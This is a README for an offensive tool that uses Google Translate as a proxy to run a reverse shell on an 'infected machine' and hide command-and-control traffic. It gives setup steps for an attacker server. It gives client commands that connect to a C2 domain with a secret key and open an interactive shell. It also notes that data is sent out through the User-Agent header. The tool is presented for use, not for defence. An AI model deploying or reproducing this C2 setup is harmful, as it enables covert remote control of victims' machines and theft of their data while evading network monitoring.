# GTRS - Google Translator Reverse Shell

This tools uses [Google Translator](https://translate.google.com) as a proxy to send arbitrary commands to an infected machine.
```
[INFECTED MACHINE] ==HTTPS==> [GOOGLE TRANSLATE] ==HTTP==> [C2] 
```

# Environment Configuration
First you need a VPS and a domain, for the domain you can get a free one on [Freenom](https://freenom.com/).

# Server 
Start the server.py on your VPS
```bash
python2.7 server.py
Server running on port: 80
Secret Key: e294a11e-bb6f-49ed-b03a-9ec42be55062
```
It will provide you secret key which will be used on the client.

# Client bash
Run the client on a computer with access to [Google Translator](https://translate.google.com), providing domain and the secret key generated by the server.

```bash
bash client.sh www.c2server.ml e294a11e-bb6f-49ed-b03a-9ec42be55062
```
Now you have an interactive shell using named pipe files, **YES** you can `cd` into directories.

# Client Go
You first need to download the binarie or compile it, then the processe is equal of the bash client,
```bash
./client_Linux www.c2server.ml e294a11e-bb6f-49ed-b03a-9ec42be55062
```
With this client you have the hability to run it on Linux, Mac and Windows, but the client do not have a interactive shell yet.

# Poc 
[![CODE_IS_CHEAP_SHOW_ME_THE_DEMO](http://img.youtube.com/vi/02CFsE0k96E/0.jpg)](http://www.youtube.com/watch?v=02CFsE0k96E)

# Known issues 
 * ~~Google translate does not forward POST data, so there's a limit on the amount of data that your server can receive, for example, you'll probably not being able to read a big file like `.bashrc`.~~ `Problem fixed using User-Agent header to sent data`.
 * ~~The client script works on Mac an Linux, but on Linux you need to install the `xmllint` which is on `libxml2-utils`~~ `Problem fixed, now the client is write also in go.
 * It's not a problem, but I just don't know if there's a rate limit on Google Translator
